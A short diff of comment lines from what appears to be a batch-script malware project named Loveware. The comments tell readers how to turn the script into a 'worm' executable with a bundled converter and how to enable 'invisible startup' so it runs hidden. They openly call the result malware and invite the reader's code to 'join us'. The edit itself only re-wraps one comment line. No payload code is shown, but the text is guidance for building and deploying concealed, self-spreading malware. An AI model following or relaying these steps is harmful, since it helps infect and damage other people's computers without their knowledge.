@@ -55,8 +55,7 @@
 :: To make the worm, you will need to convert Loveware.bat to an exe.
 :: You can do this easely with the converter that is availeble in this repository (Extras >> CONVERTER >> *.exe)
 :: When you convert the batch script you will need to add the invisible startup option, just check the little check box
-:: that sais somthing like "Invisible startup". After you converted it you can use the new file you got (you can give it any :: name you want), but do not forget to be carefull because this is malware!!!
+:: that sais somthing like "Invisible startup". After you converted it you can use the new file you got (you can give it any :: name you want),
+:: but do not forget to be carefull because this is malware!!!
 ::
 :: I hope that your code will soon join us!
-
-
